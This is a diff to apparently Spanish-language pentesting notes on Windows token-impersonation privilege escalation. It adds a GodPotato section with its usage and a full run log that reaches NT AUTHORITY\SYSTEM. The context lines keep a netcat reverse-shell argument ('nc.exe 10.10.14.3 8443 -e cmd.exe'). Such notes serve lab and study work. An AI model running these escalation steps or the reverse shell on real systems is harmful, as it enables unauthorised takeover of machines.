@@ -35,6 +35,70 @@
         - `-a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe"` es la argumento que se va a pasar a la binary que se va a ejecutar.
         - `-t *` es el token de servicio que se va a utilizar.
 
+### GodPotato
+- Afecta a versiones modernas si tenemos el privilegio SeImpersonatePrivilege.
+- [Repositorio](https://github.com/BeichenDream/GodPotato)
+
+```powershell
+c:\Users\Public\GodPotato-NET4.exe
+                                                                                               
+    FFFFF                   FFF  FFFFFFF                                                       
+   FFFFFFF                  FFF  FFFFFFFF                                                      
+  FFF  FFFF                 FFF  FFF   FFF             FFF                  FFF                
+  FFF   FFF                 FFF  FFF   FFF             FFF                  FFF                
+  FFF   FFF                 FFF  FFF   FFF             FFF                  FFF                
+ FFFF        FFFFFFF   FFFFFFFF  FFF   FFF  FFFFFFF  FFFFFFFFF   FFFFFF  FFFFFFFFF    FFFFFF   
+ FFFF       FFFF FFFF  FFF FFFF  FFF  FFFF FFFF FFFF   FFF      FFF  FFF    FFF      FFF FFFF  
+ FFFF FFFFF FFF   FFF FFF   FFF  FFFFFFFF  FFF   FFF   FFF      F    FFF    FFF     FFF   FFF  
+ FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF         FFFFF    FFF     FFF   FFFF 
+ FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF      FFFFFFFF    FFF     FFF   FFFF 
+  FFF   FFF FFF   FFF FFF   FFF  FFF       FFF   FFF   FFF     FFFF  FFF    FFF     FFF   FFFF 
+  FFFF FFFF FFFF  FFF FFFF  FFF  FFF       FFF  FFFF   FFF     FFFF  FFF    FFF     FFFF  FFF  
+   FFFFFFFF  FFFFFFF   FFFFFFFF  FFF        FFFFFFF     FFFFFF  FFFFFFFF    FFFFFFF  FFFFFFF   
+    FFFFFFF   FFFFF     FFFFFFF  FFF         FFFFF       FFFFF   FFFFFFFF     FFFF     FFFF    
+
+
+Arguments:
+
+	-cmd Required:True CommandLine (default cmd /c whoami)
+
+Example:
+
+GodPotato -cmd "cmd /c whoami" 
+GodPotato -cmd "cmd /c whoami" 
+
+
+c:\windows\system32\inetsrv>c:\Users\Public\GodPotato-NET4.exe -cmd "cmd /c whoami"
+c:\Users\Public\GodPotato-NET4.exe -cmd "cmd /c whoami"
+[*] CombaseModule: 0x140715645927424
+[*] DispatchTable: 0x140715648233536
+[*] UseProtseqFunction: 0x140715647610064
+[*] UseProtseqFunctionParamCount: 6
+[*] HookRPC
+[*] Start PipeServer
+[*] Trigger RPCSS
+[*] CreateNamedPipe \\.\pipe\ca325e81-9e6f-49eb-a8cd-c45cec8c750b\pipe\epmapper
+[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+[*] DCOM obj IPID: 0000a802-02c0-ffff-5aab-e8e14a3bd34a
+[*] DCOM obj OXID: 0x2efb74e345b53fb6
+[*] DCOM obj OID: 0x8313c62f83938f2f
+[*] DCOM obj Flags: 0x281
+[*] DCOM obj PublicRefs: 0x0
+[*] Marshal Object bytes len: 100
+[*] UnMarshal Object
+[*] Pipe Connected!
+[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 924 Token:0x816  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 4932
+nt authority\system
+```
+
+
 
 ### Rogue Potato
 - RoguePotato es un script de windows que nos permite obtener un token de servicio con privilegios elevados.
